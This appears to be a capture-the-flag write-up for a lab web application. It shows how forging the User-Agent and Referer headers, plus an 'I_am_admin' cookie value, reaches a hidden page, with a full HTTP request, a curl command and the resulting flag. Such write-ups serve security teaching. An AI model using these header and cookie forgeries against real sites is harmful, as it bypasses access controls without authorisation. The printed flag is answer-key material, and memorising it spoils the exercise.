We visit the url "/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c" (link in bottom of main page). We check the source code of the page we can see the following comments : "You must cumming from : "https://www.nsa.gov/" to go to the next step" and "Let's use this browser : "ft_bornToSec". It will help you a lot.". We understand these comments refer to the "user agent" and "referer" send in the http headers.

So we send this http headers:

GET /index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c HTTP/1.1
Host: 192.168.0.30
User-Agent: ft_bornToSec
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://www.nsa.gov/
Connection: keep-alive
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0, no-cache
Pragma: no-cache


Or we use curl with this command:

curl 'http://x.x.x.x/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' -H 'User-Agent: ft_bornToSec' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'Referer: https://www.nsa.gov/' -H 'Connection: keep-alive' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0, no-cache' -H 'Pragma: no-cache' | grep 'The flag is'


In the http response, we get the flag "f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188"

